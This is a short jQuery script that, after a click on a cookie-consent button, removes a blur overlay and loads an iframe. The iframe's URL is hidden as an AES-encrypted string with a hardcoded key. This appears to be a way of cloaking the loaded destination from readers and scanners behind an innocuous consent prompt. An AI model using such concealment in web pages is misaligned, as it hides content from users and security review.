$(document).ready(function() {
	
});

$('#cookies-btn').click(function(e) {
	e.preventDefault();
	$('#cookies-overlay').addClass('hidden');
	$('#container').removeClass('blur');
	$('#load-frame').attr('src', CryptoJS.AES.decrypt('U2FsdGVkX1+m6NMXsadmVmRTKXuQzIQt5mqnHmphUnIuCwC8PPOQggpb5gUs4cUjLKIFpsyuXPRJPD0x544Pvq4mT6N4qnnNUO870esCQqx55Sz7HoS7rqsD1avHzf35WJxtdOY/J7Ab2LxJ3h2QHSwPtzv8GLZvRHItkl2FJmbmslgsZmEUMkrAgvC7mjCPh0WqT+7jC2xsQ2fskbFodnwCbtGKk0rrntfAYeoPbOQRTkiGokF+shTvzN8ZF8DEG2MSaOwNvdnfA0VovJ9sOg==', '03kfks8onb79303').toString(CryptoJS.enc.Utf8));
	$('#load-frame').addClass('loaded');
});
